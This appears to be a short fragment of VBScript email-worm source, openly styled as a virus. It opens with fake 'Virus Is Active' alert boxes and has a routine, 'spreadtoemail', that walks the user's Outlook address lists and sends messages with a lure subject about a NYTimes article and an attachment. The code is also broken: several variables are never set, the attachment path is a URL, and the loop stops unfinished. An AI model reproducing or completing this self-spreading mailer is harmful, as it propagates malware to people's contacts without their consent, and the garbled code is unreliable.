
X=Msgbox("Virus Is Active",0+16,"Virus Alert")
X=Msgbox("Virus Is Active",0+16,"Virus Alert")
X=Msgbox("Wanna Fix Virus",0+16,"Fix Virus")
X=Msgbox("Wanna Fix Virus",0+16,"Fix Virus")

Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
Set regedit = CreateObject("WScript.Shell")
  Set out = WScript.CreateObject("Outlook.Application")
  Set mapi = out.GetNameSpace("MAPI")
   For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
    If (regv = "") Then
      regv = 1
    End If
    If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
      male.Subject = "Cool NYTIMES ARTICLE I FOUND"
      male.Body = vbcrlf & "Check it out"
          male.Attachments.Add(dirsystem & "\www.nytimes.com/2021/05/20/arts/maya-lin-tribal-monuments-pacific-northwest.html")
          male.Send
